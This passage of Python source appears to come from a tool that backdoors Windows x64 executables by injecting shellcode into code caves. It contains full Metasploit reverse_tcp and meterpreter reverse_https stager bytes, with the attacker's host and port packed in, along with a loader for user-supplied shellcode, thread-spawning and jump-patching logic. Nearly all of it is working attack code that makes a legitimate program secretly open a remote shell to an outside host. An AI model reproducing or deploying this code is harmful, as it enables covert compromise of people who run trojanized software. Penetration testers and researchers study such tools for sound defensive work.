                            #"\x48\xC7\xC3\xE0\x1D\x2A\x0A"          #   mov rbx, 0x0A2A1DE0    ; The EXITFUNK as specified by user...
                            #"\x68\xa6\x95\xbd\x9d"                  #   push 0x9DBD95A6        ; hash( "kernel32.dll", "GetVersion" )
                            #"\xFF\xD5"                              #   call rbp               ; GetVersion(); (AL will = major version and AH will = minor version)
                            #"\x3C\x06"                              #   cmp al, byte 6         ; If we are not running on Windows Vista, 2008 or 7
                            #"\x7c\x0a"                              #   jl goodbye       ; Then just call the exit function...
                            #"\x80\xFB\xE0"                          #  cmp bl, 0xE0           ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
                            #"\x75\x05"                              #   jne goodbye      ;
                            #"\x48\xC7\xC3\x47\x13\x72\x6F"          #   mov rbx, 0x6F721347    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
                            # goodbye:                 ; We now perform the actual call to the exit function
                            #"\x6A\x00"                              #   push byte 0            ; push the exit function parameter
                            #"\x53"                                  #   push rbx               ; push the hash of the exit function
                            #"\xFF\xD5"                              #   call rbp               ; call EXITFUNK( 0 );

                            #set_handler:
                            "\x48\x31\xC0" #  xor rax,rax
                            
                            "\x50"                                  #  push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                  #  push rax          ; DWORD dwCreationFlags (0)
                            "\x49\x89\xC1"                          # mov r9, rax        ; LPVOID lpParameter (NULL)
                            "\x48\x89\xC2"                          #mov rdx, rax        ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x49\x89\xD8"                          #mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            "\x48\x89\xC1"                          #mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x49\xC7\xC2\x38\x68\x0D\x16"          #mov r10, 0x160D6838  ; hash( "kernel32.dll", "CreateThread" )
                            "\xFF\xD5"                              #  call rbp               ; Spawn payload thread
                            "\x48\x83\xC4\x58"                      #add rsp, 50
                            
                            #stackrestore
                            "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            )
        
        
        breakupvar = eat_code_caves(flItms, 0, 2)
        
        #Jump to the win64 return to normal execution code segment.
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip('L')), 16))
        else:
            self.shellcode1 += "\xE9\xab\x01\x00\x00"

        
        breakupvar = eat_code_caves(flItms, 0, 1)
        
        #get_payload:  #Jump back with the address for the payload on the stack.
        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 272).rstrip('L')), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 272).rstrip('L')), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 244).rstrip('L')), 16))
        else:
            self.shellcode2 = "\xE8\xB8\xFF\xFF\xFF"
        
        """
        shellcode2
        /*
         * windows/x64/shell/reverse_tcp - 422 bytes (stage 1)
           ^^windows/x64/meterpreter/reverse_tcp will work with this
         * http://www.metasploit.com
         * VERBOSE=false, LHOST=127.0.0.1, LPORT=8080, 
         * ReverseConnectRetries=5, ReverseListenerBindPort=0, 
         * ReverseAllowProxy=false, EnableStageEncoding=false, 
         * PrependMigrate=false, EXITFUNC=thread, 
         * InitialAutoRunScript=, AutoRunScript=
         */
         """
                       
        #payload  
        self.shellcode2 += ( "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
                            "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                            "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                            "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                            "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                            "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
                            "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
                            "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
                            "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
                            "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
                            "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
                            "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
                            "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
                            "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
                            "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
                            "\x49\x89\xe5\x49\xbc\x02\x00"
                            #"\x1f\x90"
                            #"\x7f\x00\x00\x01"
                            )
        self.shellcode2 += struct.pack('!h', self.PORT)
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += ( "\x41\x54"
                            "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
                            "\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
                            "\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
                            "\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
                            "\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
                            "\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec"
                            "\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41"
                            "\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41"
                            "\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41"
                            "\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
                            "\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8"
                            "\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41"
                            "\xff\xe7"
                            )

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def meterpreter_reverse_https(self, flItms, CavesPicked={}):
        """
        Win64 version
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)
        
        flItms['stager'] = True

        #overloading the class stackpreserve
        self.stackpreserve = ("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        breakupvar = eat_code_caves(flItms, 0, 1)
       
        self.shellcode1 = ( "\x90"                              #<--THAT'S A NOP. \o/
                            "\xe8\xc0\x00\x00\x00"              #jmp to allocate
                            #api_call
                            "\x41\x51"                          #push r9
                            "\x41\x50"                          #push r8
                            "\x52"                              #push rdx
                            "\x51"                              #push rcx
                            "\x56"                              #push rsi
                            "\x48\x31\xD2"                      #xor rdx,rdx
                            "\x65\x48\x8B\x52\x60"              #mov rdx,qword ptr gs:[rdx+96]
                            "\x48\x8B\x52\x18"                  #mov rdx,qword ptr [rdx+24]
                            "\x48\x8B\x52\x20"                  #mov rdx,qword ptr[rdx+32]
                            #next_mod
                            "\x48\x8b\x72\x50"                  #mov rsi,[rdx+80]
                            "\x48\x0f\xb7\x4a\x4a"              #movzx rcx,word [rdx+74]      
                            "\x4d\x31\xc9"                      #xor r9,r9
                            #loop_modname
                            "\x48\x31\xc0"                      #xor rax,rax          
                            "\xac"                              #lods
                            "\x3c\x61"                          #cmp al, 61h (a)
                            "\x7c\x02"                          #jl 02
                            "\x2c\x20"                          #sub al, 0x20 
                            #not_lowercase
                            "\x41\xc1\xc9\x0d"                  #ror r9d, 13
                            "\x41\x01\xc1"                      #add r9d, eax
                            "\xe2\xed"                          #loop until read, back to xor rax, rax
                            "\x52"                              #push rdx ; Save the current position in the module list for later
                            "\x41\x51"                          #push r9 ; Save the current module hash for later
                                                                #; Proceed to itterate the export address table,
                            "\x48\x8b\x52\x20"                  #mov rdx, [rdx+32] ; Get this modules base address
                            "\x8b\x42\x3c"                      #mov eax, dword [rdx+60] ; Get PE header
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address
                            "\x8b\x80\x88\x00\x00\x00"          #mov eax, dword [rax+136] ; Get export tables RVA
                            "\x48\x85\xc0"                      #test rax, rax ; Test if no export address table is present
                            
                            "\x74\x67"                          #je get_next_mod1 ; If no EAT present, process the next module
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address
                            "\x50"                              #push rax ; Save the current modules EAT
                            "\x8b\x48\x18"                      #mov ecx, dword [rax+24] ; Get the number of function names
                            "\x44\x8b\x40\x20"                  #mov r8d, dword [rax+32] ; Get the rva of the function names
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                                                                #; Computing the module hash + function hash
                            #get_next_func: ;
                            "\xe3\x56"                          #jrcxz get_next_mod ; When we reach the start of the EAT (we search backwards), process the next module
                            "\x48\xff\xc9"                      #  dec rcx ; Decrement the function name counter
                            "\x41\x8b\x34\x88"                  #  mov esi, dword [r8+rcx*4]; Get rva of next module name
                            "\x48\x01\xd6"                      #  add rsi, rdx ; Add the modules base address
                            "\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash of the function name
                                                                #  ; And compare it to the one we wan                        
                            #loop_funcname: ;
                            "\x48\x31\xc0"                      #xor rax, rax ; Clear rax
                            "\xac"                              #lodsb ; Read in the next byte of the ASCII function name
                            "\x41\xc1\xc9\x0d"                  #ror r9d, 13 ; Rotate right our hash value
                            "\x41\x01\xc1"                      #add r9d, eax ; Add the next byte of the name
                            "\x38\xe0"                          #cmp al, ah ; Compare AL (the next byte from the name) to AH (null)
                            "\x75\xf1"                          #jne loop_funcname ; If we have not reached the null terminator, continue
                            "\x4c\x03\x4c\x24\x08"              #add r9, [rsp+8] ; Add the current module hash to the function hash
                            "\x45\x39\xd1"                      #cmp r9d, r10d ; Compare the hash to the one we are searchnig for
                            "\x75\xd8"                          #jnz get_next_func ; Go compute the next function hash if we have not found it
                                                                #; If found, fix up stack, call the function and then value else compute the next one...
                            "\x58"                              #pop rax ; Restore the current modules EAT
                            "\x44\x8b\x40\x24"                  #mov r8d, dword [rax+36] ; Get the ordinal table rva
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                            "\x66\x41\x8b\x0c\x48"              #mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                            "\x44\x8b\x40\x1c"                  #mov r8d, dword [rax+28] ; Get the function addresses table rva
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                            "\x41\x8b\x04\x88"                  #mov eax, dword [r8+4*rcx]; Get the desired functions RVA
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address to get the functions actual VA
                                                                #; We now fix up the stack and perform the call to the drsired function...
                            #finish:
                            "\x41\x58"                          #pop r8 ; Clear off the current modules hash
                            "\x41\x58"                          #pop r8 ; Clear off the current position in the module list
                            "\x5E"                              #pop rsi ; Restore RSI
                            "\x59"                              #pop rcx ; Restore the 1st parameter
                            "\x5A"                              #pop rdx ; Restore the 2nd parameter
                            "\x41\x58"                          #pop r8 ; Restore the 3rd parameter
                            "\x41\x59"                          #pop r9 ; Restore the 4th parameter
                            "\x41\x5A"                          #pop r10 ; pop off the return address
                            "\x48\x83\xEC\x20"                  #sub rsp, 32 ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
                                                                # ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
                            "\x41\x52"                          #push r10 ; push back the return address
                            "\xFF\xE0"                          #jmp rax ; Jump into the required function
                                                                #; We now automagically return to the correct caller...
                            #get_next_mod: ;
                            "\x58"                              #pop rax ; Pop off the current (now the previous) modules EAT
                            #get_next_mod1: ;
                            "\x41\x59"                          #pop r9 ; Pop off the current (now the previous) modules hash
                            "\x5A"                              #pop rdx ; Restore our position in the module list
                            "\x48\x8B\x12"                      #mov rdx, [rdx] ; Get the next module
                            "\xe9\x57\xff\xff\xff"              #jmp next_mod ; Process this module
                            )

        self.shellcode1 += (#allocate
                            "\x5d"                              #pop rbp
                            "\x49\xc7\xc6"                      #mov r14, 1abh size of payload...   
                            )
        self.shellcode1 += struct.pack("<H", 583 + len(self.HOST))
        self.shellcode1 += ("\x00\x00"
                            "\x6a\x40"                          #push 40h
                            "\x41\x59"                          #pop r9 now 40h
                            "\x68\x00\x10\x00\x00"              #push 1000h
                            "\x41\x58"                          #pop r8.. now 1000h
                            "\x4C\x89\xF2"                      #mov rdx, r14
                            "\x6A\x00"                          # push 0
                            "\x59"                              # pop rcx
                            "\x68\x58\xa4\x53\xe5"              #push E553a458
                            "\x41\x5A"                          #pop r10
                            "\xff\xd5"                          #call rbp
                            "\x48\x89\xc3"                      #mov rbx, rax      ; Store allocated address in ebx
                            "\x48\x89\xc7"                      #mov rdi, rax      ; Prepare EDI with the new address
                            )
                                                                #mov rcx, 0x1abE
        self.shellcode1 += "\x48\xc7\xc1"
        self.shellcode1 += struct.pack("<H", 583 + len(self.HOST))
        self.shellcode1 += "\x00\x00"
                            
        #call the get_payload right before the payload
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x43" 

                            # got_payload:
        self.shellcode1 += ( "\x5e"                                 #pop rsi            ; Prepare ESI with the source to copy               
                            "\xf2\xa4"                              #rep movsb          ; Copy the payload to RWX memory
                            "\xe8\x00\x00\x00\x00"                  #call set_handler   ; Configure error handling

                            #set_handler:
                            "\x48\x31\xC0" #  xor rax,rax
                            
                            "\x50"                                  #  push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                  #  push rax          ; DWORD dwCreationFlags (0)
                            "\x49\x89\xC1"                          # mov r9, rax        ; LPVOID lpParameter (NULL)
                            "\x48\x89\xC2"                          #mov rdx, rax        ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x49\x89\xD8"                          #mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            "\x48\x89\xC1"                          #mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x49\xC7\xC2\x38\x68\x0D\x16"          #mov r10, 0x160D6838  ; hash( "kernel32.dll", "CreateThread" )
                            "\xFF\xD5"                              #  call rbp               ; Spawn payload thread
                            "\x48\x83\xC4\x58"                      #add rsp, 50
                            
                            #stackrestore
                            "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            )
        
        
        breakupvar = eat_code_caves(flItms, 0, 2)
        
        #Jump to the win64 return to normal execution code segment.
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip('L')), 16))
        else:
            self.shellcode1 += "\xE9"
            self.shellcode1 += struct.pack("<H", 583 + len(self.HOST))
            self.shellcode1 += "\x00\x00"
            #self.shellcode1 += "\xE9\x47\x02\x00\x00"

        
        breakupvar = eat_code_caves(flItms, 0, 1)
        
        #get_payload:  #Jump back with the address for the payload on the stack.
        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 272).rstrip('L')), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 272).rstrip('L')), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 244).rstrip('L')), 16))
        else:
            self.shellcode2 = "\xE8\xB8\xFF\xFF\xFF"
        
        """
         /*
         * windows/x64/meterpreter/reverse_https - 587 bytes (stage 1)
         * http://www.metasploit.com
         * VERBOSE=false, LHOST=127.0.0.1, LPORT=8080, 
         * SessionExpirationTimeout=604800, 
         * SessionCommunicationTimeout=300, 
         * MeterpreterUserAgent=Mozilla/4.0 (compatible; MSIE 6.1; 
         * Windows NT), MeterpreterServerName=Apache, 
         * ReverseListenerBindPort=0, 
         * HttpUnknownRequestResponse=<html><body><h1>It 
         * works!</h1></body></html>, EnableStageEncoding=false, 
         * PrependMigrate=false, EXITFUNC=thread, AutoLoadStdapi=true, 
         * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, 
         * EnableUnicodeEncoding=true
         */
        """
                       
        #payload
        self.shellcode2 += ("\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52"
                        "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                        "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                        "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                        "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                        "\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00"
                        "\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b"
                        "\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
                        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
                        "\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
                        "\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b"
                        "\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41"
                        "\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41"
                        "\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff"
                        "\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56"
                        "\x49\x89\xe6\x4c\x89\xf1\x49\xba\x4c\x77\x26\x07\x00\x00\x00"
                        "\x00\xff\xd5\x6a\x00\x6a\x00\x48\x89\xe1\x48\x31\xd2\x4d\x31"
                        "\xc0\x4d\x31\xc9\x41\x50\x41\x50\x49\xba\x3a\x56\x79\xa7\x00"
                        "\x00\x00\x00\xff\xd5\xe9\x9e\x00\x00\x00\x5a\x48\x89\xc1\x49"
                        "\xb8")
        self.shellcode2 += struct.pack("<h", self.PORT)    
        self.shellcode2 += ("\x00\x00\x00\x00\x00\x00\x4d\x31\xc9\x41\x51\x41"
                        "\x51\x6a\x03\x41\x51\x49\xba\x57\x89\x9f\xc6\x00\x00\x00\x00"
                        "\xff\xd5\xeb\x7c\x48\x89\xc1\x48\x31\xd2\x41\x58\x4d\x31\xc9"
                        "\x52\x68\x00\x32\xa0\x84\x52\x52\x49\xba\xeb\x55\x2e\x3b\x00"
                        "\x00\x00\x00\xff\xd5\x48\x89\xc6\x6a\x0a\x5f\x48\x89\xf1\x48"
                        "\xba\x1f\x00\x00\x00\x00\x00\x00\x00\x6a\x00\x68\x80\x33\x00"
                        "\x00\x49\x89\xe0\x49\xb9\x04\x00\x00\x00\x00\x00\x00\x00\x49"
                        "\xba\x75\x46\x9e\x86\x00\x00\x00\x00\xff\xd5\x48\x89\xf1\x48"
                        "\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x52\x52\x49\xba\x2d\x06\x18"
                        "\x7b\x00\x00\x00\x00\xff\xd5\x85\xc0\x75\x24\x48\xff\xcf\x74"
                        "\x13\xeb\xb1\xe9\x81\x00\x00\x00\xe8\x7f\xff\xff\xff\x2f\x75"
                        "\x47\x48\x58\x00\x00\x49\xbe\xf0\xb5\xa2\x56\x00\x00\x00\x00"
                        "\xff\xd5\x48\x31\xc9\x48\xba\x00\x00\x40\x00\x00\x00\x00\x00"
                        "\x49\xb8\x00\x10\x00\x00\x00\x00\x00\x00\x49\xb9\x40\x00\x00"
                        "\x00\x00\x00\x00\x00\x49\xba\x58\xa4\x53\xe5\x00\x00\x00\x00"
                        "\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda"
                        "\x49\xb8\x00\x20\x00\x00\x00\x00\x00\x00\x49\x89\xf9\x49\xba"
                        "\x12\x96\x89\xe2\x00\x00\x00\x00\xff\xd5\x48\x83\xc4\x20\x85"
                        "\xc0\x74\x99\x48\x8b\x07\x48\x01\xc3\x48\x85\xc0\x75\xce\x58"
                        "\x58\xc3\xe8\xd7\xfe\xff\xff")
        self.shellcode2 += self.HOST
        self.shellcode2 +=  "\x00"


        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def user_supplied_shellcode(self, flItms, CavesPicked={}):
        """
        User supplies the shellcode, make sure that it EXITs via a thread.
        """
        
        flItms['stager'] = True

        if flItms['supplied_shellcode'] is None:
            print "[!] User must provide shellcode for this module (-U)"
            sys.exit(0)
        else:
            self.supplied_shellcode =  open(self.SUPPLIED_SHELLCODE, 'r+b').read()


        #overloading the class stackpreserve
        self.stackpreserve = ("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        breakupvar = eat_code_caves(flItms, 0, 1)
       
        self.shellcode1 = ( "\x90"                              #<--THAT'S A NOP. \o/
                            "\xe8\xc0\x00\x00\x00"              #jmp to allocate
                            #api_call
                            "\x41\x51"                          #push r9
                            "\x41\x50"                          #push r8
                            "\x52"                              #push rdx
                            "\x51"                              #push rcx
                            "\x56"                              #push rsi
                            "\x48\x31\xD2"                      #xor rdx,rdx
                            "\x65\x48\x8B\x52\x60"              #mov rdx,qword ptr gs:[rdx+96]
                            "\x48\x8B\x52\x18"                  #mov rdx,qword ptr [rdx+24]
                            "\x48\x8B\x52\x20"                  #mov rdx,qword ptr[rdx+32]
                            #next_mod
                            "\x48\x8b\x72\x50"                  #mov rsi,[rdx+80]
                            "\x48\x0f\xb7\x4a\x4a"              #movzx rcx,word [rdx+74]      
                            "\x4d\x31\xc9"                      #xor r9,r9
                            #loop_modname
                            "\x48\x31\xc0"                      #xor rax,rax          
                            "\xac"                              #lods
                            "\x3c\x61"                          #cmp al, 61h (a)
                            "\x7c\x02"                          #jl 02
                            "\x2c\x20"                          #sub al, 0x20 
                            #not_lowercase
                            "\x41\xc1\xc9\x0d"                  #ror r9d, 13
                            "\x41\x01\xc1"                      #add r9d, eax
                            "\xe2\xed"                          #loop until read, back to xor rax, rax
                            "\x52"                              #push rdx ; Save the current position in the module list for later
                            "\x41\x51"                          #push r9 ; Save the current module hash for later
                                                                #; Proceed to itterate the export address table,
                            "\x48\x8b\x52\x20"                  #mov rdx, [rdx+32] ; Get this modules base address
                            "\x8b\x42\x3c"                      #mov eax, dword [rdx+60] ; Get PE header
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address
                            "\x8b\x80\x88\x00\x00\x00"          #mov eax, dword [rax+136] ; Get export tables RVA
                            "\x48\x85\xc0"                      #test rax, rax ; Test if no export address table is present
                            
                            "\x74\x67"                          #je get_next_mod1 ; If no EAT present, process the next module
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address
                            "\x50"                              #push rax ; Save the current modules EAT
                            "\x8b\x48\x18"                      #mov ecx, dword [rax+24] ; Get the number of function names
                            "\x44\x8b\x40\x20"                  #mov r8d, dword [rax+32] ; Get the rva of the function names
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                                                                #; Computing the module hash + function hash
                            #get_next_func: ;
                            "\xe3\x56"                          #jrcxz get_next_mod ; When we reach the start of the EAT (we search backwards), process the next module
                            "\x48\xff\xc9"                      #  dec rcx ; Decrement the function name counter
                            "\x41\x8b\x34\x88"                  #  mov esi, dword [r8+rcx*4]; Get rva of next module name
                            "\x48\x01\xd6"                      #  add rsi, rdx ; Add the modules base address
                            "\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash of the function name
                                                                #  ; And compare it to the one we wan                        
                            #loop_funcname: ;
                            "\x48\x31\xc0"                      #xor rax, rax ; Clear rax
                            "\xac"                              #lodsb ; Read in the next byte of the ASCII function name
                            "\x41\xc1\xc9\x0d"                  #ror r9d, 13 ; Rotate right our hash value
                            "\x41\x01\xc1"                      #add r9d, eax ; Add the next byte of the name
                            "\x38\xe0"                          #cmp al, ah ; Compare AL (the next byte from the name) to AH (null)
                            "\x75\xf1"                          #jne loop_funcname ; If we have not reached the null terminator, continue
                            "\x4c\x03\x4c\x24\x08"              #add r9, [rsp+8] ; Add the current module hash to the function hash
                            "\x45\x39\xd1"                      #cmp r9d, r10d ; Compare the hash to the one we are searchnig for
                            "\x75\xd8"                          #jnz get_next_func ; Go compute the next function hash if we have not found it
                                                                #; If found, fix up stack, call the function and then value else compute the next one...
                            "\x58"                              #pop rax ; Restore the current modules EAT
                            "\x44\x8b\x40\x24"                  #mov r8d, dword [rax+36] ; Get the ordinal table rva
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                            "\x66\x41\x8b\x0c\x48"              #mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                            "\x44\x8b\x40\x1c"                  #mov r8d, dword [rax+28] ; Get the function addresses table rva
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                            "\x41\x8b\x04\x88"                  #mov eax, dword [r8+4*rcx]; Get the desired functions RVA
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address to get the functions actual VA
                                                                #; We now fix up the stack and perform the call to the drsired function...
                            #finish:
                            "\x41\x58"                          #pop r8 ; Clear off the current modules hash
                            "\x41\x58"                          #pop r8 ; Clear off the current position in the module list
                            "\x5E"                              #pop rsi ; Restore RSI
                            "\x59"                              #pop rcx ; Restore the 1st parameter
                            "\x5A"                              #pop rdx ; Restore the 2nd parameter
                            "\x41\x58"                          #pop r8 ; Restore the 3rd parameter
                            "\x41\x59"                          #pop r9 ; Restore the 4th parameter
                            "\x41\x5A"                          #pop r10 ; pop off the return address
                            "\x48\x83\xEC\x20"                  #sub rsp, 32 ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
                                                                # ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
                            "\x41\x52"                          #push r10 ; push back the return address
                            "\xFF\xE0"                          #jmp rax ; Jump into the required function
                                                                #; We now automagically return to the correct caller...
                            #get_next_mod: ;
                            "\x58"                              #pop rax ; Pop off the current (now the previous) modules EAT
                            #get_next_mod1: ;
                            "\x41\x59"                          #pop r9 ; Pop off the current (now the previous) modules hash
                            "\x5A"                              #pop rdx ; Restore our position in the module list
                            "\x48\x8B\x12"                      #mov rdx, [rdx] ; Get the next module
                            "\xe9\x57\xff\xff\xff"              #jmp next_mod ; Process this module
                            )

        self.shellcode1 += (#allocate
                            "\x5d"                              #pop rbp
